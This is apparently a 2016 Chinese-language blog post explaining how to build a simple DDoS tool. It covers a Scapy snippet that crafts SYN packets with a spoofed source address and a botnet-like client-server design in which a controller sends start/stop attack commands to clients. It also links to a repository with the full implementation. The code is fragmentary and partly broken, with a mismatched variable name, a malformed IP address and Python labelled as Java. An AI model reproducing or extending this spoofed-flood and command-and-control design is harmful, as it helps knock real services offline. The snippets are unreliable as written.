---
title: DDoS的简单实现
date: 2016-12-06 10:52:57
tags: other
categories: Dev
---

##### Scapy实现SYN泛洪攻击
<center>![](http://ww4.sinaimg.cn/large/9bcfe727jw1fagvyplc77j20b0052mxg.jpg)</center>

Scapy是一个可以让用户发送、侦听和解析并伪装网络报文的Python程序。这些功能可以用于制作侦测、扫描和攻击网络的工具。它的作用很多，简单如上图描述。

SYN泛洪攻击(SYN Flood)是一种比较常用的DoS方式之一。通过发送大量伪造的Tcp连接请求，使被攻击主机资源耗尽(通常是CPU满负荷或者内存不足) 的攻击方式。SYN泛洪攻击利用三次握手，客户端向服务器发送SYN报文之后就不再响应服务器回应的报文。由于服务器在处理TCP请求时，会在协议栈留一块缓冲区来存储握手的过程，当然如果超过一定的时间内没有接收到客户端的报文，本次连接在协议栈中存储的数据将会被丢弃。攻击者如果利用这段时间发送大量的连接请求，全部挂起在半连接状态。这样将不断消耗服务器资源，直到拒绝服务。

利用scapy构造一个SYN数据包的方法是：

    pkg = IP(src="202.121.0.12",dst="192.168.0.100")/TCP(sport=100,dport=80,flags="S")
    send(pkt)

其中，IP包中指定了源地址src和目的地址dst，其中src是我们伪造的地址，这是DoS攻击中保护攻击者的一种方式。
flags的值我们设定为S,说明我们要发送的是SYN数据包，目标端口dport为80，发送端口sport为100。

##### Socket实现DDoS攻击
总体采用CS模式，客户机连接服务器，服务器发送指令，然后客户机发起攻击，客户机使用伪装的IP攻击。
事先规定攻击命令：

    #-H xxx.xxx.xxx.xxx -p xxxx -c <start|stop>

'xxx.xxx.xxx.xxx'是目标地址， xxxx表示端口号，int型
命令可以是start：开始攻击；stop：停止攻击

###### python中的socket使用
<b>客户端</b>
```java
import socket

#创建socket: AF_INET表示IPV4协议, SOCK_STREAM表示基于流的TCP协议
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#建立连接, 指定服务器的IP和端口
s.connect(('192.168.0,100', 7786))
```
<b>服务器</b>
```java
import socket

cliList = []
# 创建socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 绑定地址和端口号
s.bind(('0.0.0.0', 7786))：
# 开始监听，指定最大连接数为10
s.listen(10)
while True:
    # 接受一个新的连接:
    sock, addr = s.accept()
    #将sock添加到列表中
    cliList.append(sock)
```

###### python多线程 & 多进程
```java
t = Thread(target = func, args = (arg1, arg2))
t.start()

p = Process(target = func, args = (arg1, arg2))
p.start()
```

客户机接受了服务器的命令后，启动一个进程发动攻击，一个客户端可以伪造不同的IP发送大量的SYN请求，大量客户端一起工作瘫痪目标。

[具体的实现点击这里](https://github.com/Atlantic8/Project/tree/master/simple%20implementation%20of%20DDoS)
